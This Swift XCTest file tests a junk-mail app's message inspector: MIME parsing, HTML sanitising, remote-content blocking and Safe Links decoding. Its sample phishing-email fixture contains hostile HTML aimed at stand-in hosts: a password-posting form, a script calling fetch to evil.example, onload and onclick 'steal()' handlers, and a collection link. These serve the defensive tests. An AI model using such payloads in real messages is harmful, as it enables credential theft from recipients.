import Foundation
import XCTest
@testable import JunkMailCleaner

final class MessageInspectorTests: XCTestCase {
    func testParsesHeadersBodyLinksAttachmentsAndPreservesRawSource() {
        let source = sampleSource
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: source, mailBody: "Apple Mail body")
        )

        XCTAssertEqual(data.rawSource, source)
        XCTAssertEqual(data.firstHeader(named: "From"), "PayPal Notice <notice@evil.example>")
        XCTAssertEqual(data.firstHeader(named: "To"), "victim@example.com")
        XCTAssertEqual(data.firstHeader(named: "Subject"), "Account payment notice")
        XCTAssertEqual(data.headers(named: "Received").count, 2)
        XCTAssertTrue(data.visibleHTMLText.contains("Review PayPal.com account"))

        XCTAssertEqual(data.links.count, 1)
        XCTAssertEqual(data.links[0].visibleText, "Review PayPal.com account")
        XCTAssertEqual(data.links[0].destination, "https://attacker.example/collect")
        XCTAssertEqual(data.links[0].destinationDomain, "attacker.example")
        XCTAssertTrue(data.links[0].hasDisplayDestinationMismatch)

        XCTAssertEqual(data.attachments.count, 2)
        XCTAssertTrue(data.attachments.contains {
            $0.filename == "logo.png" && $0.mimeType == "image/png" && $0.isInline
        })
        XCTAssertTrue(data.attachments.contains {
            $0.filename == "invoice.pdf" && $0.mimeType == "application/pdf"
                && $0.size == 5 && !$0.isInline
        })
    }

    func testSafeHTMLBlocksActiveAndRemoteContentButAllowsCIDImageData() throws {
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: sampleSource, mailBody: "")
        )
        let html = try XCTUnwrap(data.safeHTML)
        let normalized = html.lowercased()

        XCTAssertTrue(normalized.contains("content-security-policy"))
        XCTAssertTrue(normalized.contains("script-src 'none'"))
        XCTAssertTrue(normalized.contains("data:image/png;base64,"))
        XCTAssertFalse(normalized.contains("<script"))
        XCTAssertFalse(normalized.contains("<form"))
        XCTAssertFalse(normalized.contains("src=\"https://"))
        XCTAssertTrue(normalized.contains("href=\"https://attacker.example/collect\""))
        XCTAssertFalse(normalized.contains("onclick="))
        XCTAssertTrue(normalized.contains("<input"))
    }

    func testExtractsHTMLInsteadOfUsingPlainTextFallback() throws {
        let raw = """
        MIME-Version: 1.0
        Content-Type: multipart/alternative; boundary="choice"

        --choice
        Content-Type: text/plain; charset=utf-8

        Plain fallback
        --choice
        Content-Type: text/html; charset=utf-8

        <html><head><style>.offer { color: red; }</style></head><body><table><tr><td class="offer">HTML offer</td></tr></table></body></html>
        --choice--
        """
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: raw, mailBody: "Apple Mail fallback")
        )

        let originalHTML = try XCTUnwrap(data.originalHTML)
        XCTAssertTrue(originalHTML.contains("<table>"))
        XCTAssertTrue(originalHTML.contains("HTML offer"))
        XCTAssertTrue(try XCTUnwrap(data.safeHTML).contains(".offer { color: red; }"))
    }

    func testExtractsPlainTextWhenHTMLIsUnavailable() {
        let raw = """
        Content-Type: text/plain; charset=utf-8
        Content-Transfer-Encoding: 8bit

        Plain text message only.
        """
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: raw, mailBody: "")
        )

        XCTAssertNil(data.originalHTML)
        XCTAssertTrue(data.plainText.contains("Plain text message only."))
        XCTAssertNil(data.safeHTML)
    }

    func testDecodesBase64HTML() throws {
        let body = "<html><body><b>Base64 message</b></body></html>"
        let encoded = try XCTUnwrap(body.data(using: .utf8)).base64EncodedString()
        let raw = """
        Content-Type: text/html; charset=utf-8
        Content-Transfer-Encoding: base64

        \(encoded)
        """
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: raw, mailBody: "")
        )

        XCTAssertEqual(data.originalHTML, body)
    }

    func testDecodesQuotedPrintableHTML() throws {
        let raw = """
        Content-Type: text/html; charset=utf-8
        Content-Transfer-Encoding: quoted-printable

        <html><body><p style=3D"color: #123456">Quoted=20Printable</p></body></html>
        """
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: raw, mailBody: "")
        )

        let html = try XCTUnwrap(data.originalHTML)
        XCTAssertTrue(html.contains("style=\"color: #123456\""))
        XCTAssertTrue(html.contains("Quoted Printable"))
    }

    func testNestedMultipartResolvesCIDImageLocally() throws {
        let raw = """
        MIME-Version: 1.0
        Content-Type: multipart/mixed; boundary="mixed"

        --mixed
        Content-Type: multipart/alternative; boundary="alternative"

        --alternative
        Content-Type: text/plain

        Plain version
        --alternative
        Content-Type: multipart/related; boundary="related"

        --related
        Content-Type: text/html

        <html><body><img src="cid:Logo.Image"><strong>Nested HTML</strong></body></html>
        --related
        Content-Type: image/gif; name="logo.gif"
        Content-Disposition: inline; filename="logo.gif"
        Content-ID: <logo.image>
        Content-Transfer-Encoding: base64

        R0lGODlhAQABAAAAACw=
        --related--
        --alternative--
        --mixed--
        """
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: raw, mailBody: "")
        )

        XCTAssertTrue(try XCTUnwrap(data.originalHTML).contains("Nested HTML"))
        XCTAssertTrue(try XCTUnwrap(data.safeHTML).contains("data:image/gif;base64,"))
        XCTAssertEqual(data.attachments.first?.mimeType, "image/gif")
    }

    func testDecodesMicrosoftSafeLinksWithoutVisitingDestination() throws {
        let protected = "https://nam01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example%2Flogin%3Fa%3D1&data=tracking"
        let destination = MicrosoftSafeLinksDecoder.actualDestination(from: protected)
        XCTAssertEqual(destination, "https://evil.example/login?a=1")

        let link = try XCTUnwrap(
            EmailLinkExtractor.describe(destination: protected, visibleText: "Open document")
        )
        XCTAssertEqual(link.destination, protected)
        XCTAssertEqual(link.actualDestination, "https://evil.example/login?a=1")
        XCTAssertEqual(link.destinationDomain, "evil.example")
    }

    func testRemoteResourcesAreBlockedUntilExplicitlyEnabled() throws {
        let raw = """
        Content-Type: text/html

        <html><head><style>.hero { background-image: url('https://cdn.example/background.png'); }</style></head><body><img src="https://tracker.example/pixel.gif"><script src="https://evil.example/run.js"></script></body></html>
        """
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: raw, mailBody: "")
        )
        let blocked = try XCTUnwrap(data.renderedHTML(allowsRemoteImages: false)).lowercased()
        let enabled = try XCTUnwrap(data.renderedHTML(allowsRemoteImages: true)).lowercased()

        XCTAssertFalse(blocked.contains("tracker.example"))
        XCTAssertFalse(blocked.contains("cdn.example"))
        XCTAssertTrue(enabled.contains("src=\"https://tracker.example/pixel.gif\""))
        XCTAssertTrue(enabled.contains("https://cdn.example/background.png"))
        XCTAssertFalse(enabled.contains("evil.example/run.js"))

        let blockedRules = SafeEmailNetworkPolicy.contentRuleJSON(allowsRemoteImages: false)
        let enabledRules = SafeEmailNetworkPolicy.contentRuleJSON(allowsRemoteImages: true)
        XCTAssertTrue(blockedRules.contains(#""url-filter":"^http:""#))
        XCTAssertTrue(blockedRules.contains(#""url-filter":"^https:""#))
        XCTAssertFalse(blockedRules.contains("resource-type"))
        XCTAssertTrue(enabledRules.contains("resource-type"))
        XCTAssertFalse(enabledRules.contains(#""image""#))
    }

    func testRawSourceIsNeverInterpretedByParser() {
        let raw = "From: attacker@example.com\n\n<script>window.location='https://evil.example'</script>"
        let data = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: raw, mailBody: "")
        )

        XCTAssertEqual(data.rawSource, raw)
        XCTAssertTrue(data.rawSource.contains("<script>"))
        XCTAssertFalse(data.safeHTML?.contains("<script>") == true)
    }

    func testAnalysisSnapshotUsesExistingMessageResults() {
        let message = makeMessage(
            reference: reference("microsoft"),
            senderName: "Msn Changed Request",
            senderAddress: "notice@pentzero.com",
            subject: "Phone Number Changed Request",
            decodedMessageText: "Microsoft Update Request. Reject it."
        )
        let snapshot = MessageInspectorAnalysisSnapshot(message: message)

        XCTAssertEqual(snapshot.finalScore, message.combinedAnalysis.score)
        XCTAssertEqual(snapshot.finalRisk, message.combinedAnalysis.riskLevel)
        XCTAssertEqual(
            snapshot.microsoftImpersonationScore,
            message.microsoftImpersonationAnalysis.score
        )
        XCTAssertEqual(snapshot.senderScore, message.senderAnalysis.score)
        XCTAssertTrue(snapshot.reasons.contains(message.combinedAnalysis.reason))
    }

    func testSelectionReturnsOnlyTheRequestedMessage() {
        let first = makeMessage(
            reference: reference("first"),
            senderName: "First",
            senderAddress: "first@example.com",
            subject: "First"
        )
        let second = makeMessage(
            reference: reference("second"),
            senderName: "Second",
            senderAddress: "second@example.com",
            subject: "Second"
        )

        let selected = MessageInspectorSelection.message(
            for: second.reference,
            in: [first, second]
        )

        XCTAssertEqual(selected?.reference, second.reference)
        XCTAssertEqual(selected?.subject, "Second")
    }

    func testInspectionScriptIsReadOnly() {
        let script = MailService.inspectionScript(reference: reference("read-only"))
            .lowercased()

        XCTAssertTrue(script.contains("source of matchedmessage"))
        XCTAssertFalse(script.contains("move matchedmessage"))
        XCTAssertFalse(script.contains("delete matchedmessage"))
        XCTAssertFalse(script.contains("set read status"))
        XCTAssertFalse(script.contains("set flagged status"))
    }

    func testInspectionDoesNotChangeMessageOrSenderLists() async {
        let suiteName = "MessageInspectorTests.\(UUID().uuidString)"
        let defaults = try! XCTUnwrap(UserDefaults(suiteName: suiteName))
        defaults.removePersistentDomain(forName: suiteName)
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let store = await SenderListStore(defaults: defaults)
        let message = makeMessage(
            reference: reference("unchanged"),
            senderName: "Sender",
            senderAddress: "sender@example.com",
            subject: "Hello"
        )
        let originalScore = message.combinedAnalysis.score

        _ = MessageInspectorParser.parse(
            MessageInspectionSource(rawSource: sampleSource, mailBody: "")
        )

        XCTAssertEqual(message.combinedAnalysis.score, originalScore)
        let status = await store.status(for: message.senderAddress)
        XCTAssertEqual(status, .neither)
        let blacklistCount = await store.blacklistCount
        XCTAssertEqual(blacklistCount, 0)
    }

    @MainActor
    func testInspectorSenderActionsUseExistingSenderListStore() {
        let suiteName = "MessageInspectorStoreTests.\(UUID().uuidString)"
        let defaults = try! XCTUnwrap(UserDefaults(suiteName: suiteName))
        defaults.removePersistentDomain(forName: suiteName)
        defer { defaults.removePersistentDomain(forName: suiteName) }
        let store = SenderListStore(defaults: defaults)

        store.addToBlacklist(" Sender@Example.com ")
        XCTAssertEqual(store.status(for: "sender@example.com"), .blacklisted)
        store.addToWhitelist("SENDER@example.com")
        XCTAssertEqual(store.status(for: "sender@example.com"), .whitelisted)
        XCTAssertFalse(store.blacklistedAddresses.contains("sender@example.com"))
    }

    private func makeMessage(
        reference: MailMessageReference,
        senderName: String,
        senderAddress: String,
        subject: String,
        decodedMessageText: String = ""
    ) -> JunkMailMessage {
        JunkMailMessage(
            reference: reference,
            senderName: senderName,
            senderAddress: senderAddress,
            senderAnalysis: SenderAddressAnalyzer.analyze(senderAddress),
            analyzeContent: true,
            replyTo: "",
            subject: subject,
            dateReceived: Date(timeIntervalSince1970: 0),
            body: decodedMessageText,
            authenticationResults: "",
            decodedMessageText: decodedMessageText
        )
    }

    private func reference(_ suffix: String) -> MailMessageReference {
        MailMessageReference(
            accountIdentifier: "account",
            messageID: "message-\(suffix)",
            libraryIdentifier: "library-\(suffix)"
        )
    }

    private var sampleSource: String {
        """
        From: PayPal Notice <notice@evil.example>
        Reply-To: replies@evil.example
        Return-Path: <bounce@evil.example>
        To: victim@example.com
        Subject: Account payment notice
        Date: Tue, 29 Sep 2026 09:00:00 -0500
        Message-ID: <inspector-test@example.com>
        Received: by second.example
        Received: from first.example
        Authentication-Results: mx.example; spf=fail; dkim=fail; dmarc=fail
        X-MS-Exchange-Organization-SCL: 9
        MIME-Version: 1.0
        Content-Type: multipart/related; boundary="outer"

        --outer
        Content-Type: text/html; charset=utf-8
        Content-Transfer-Encoding: 8bit

        <html><body onload="steal()">
        <script>fetch('https://evil.example')</script>
        <form action="https://evil.example/post"><input name="password"></form>
        <img src="https://tracker.example/pixel.gif">
        <img src="cid:logo-1">
        <a href="https://attacker.example/collect" onclick="steal()">Review PayPal.com account</a>
        </body></html>
        --outer
        Content-Type: image/png; name="logo.png"
        Content-Disposition: inline; filename="logo.png"
        Content-ID: <logo-1>
        Content-Transfer-Encoding: base64

        iVBORw0KGgo=
        --outer
        Content-Type: application/pdf; name="invoice.pdf"
        Content-Disposition: attachment; filename="invoice.pdf"
        Content-Transfer-Encoding: base64

        SGVsbG8=
        --outer--
        """
    }
}
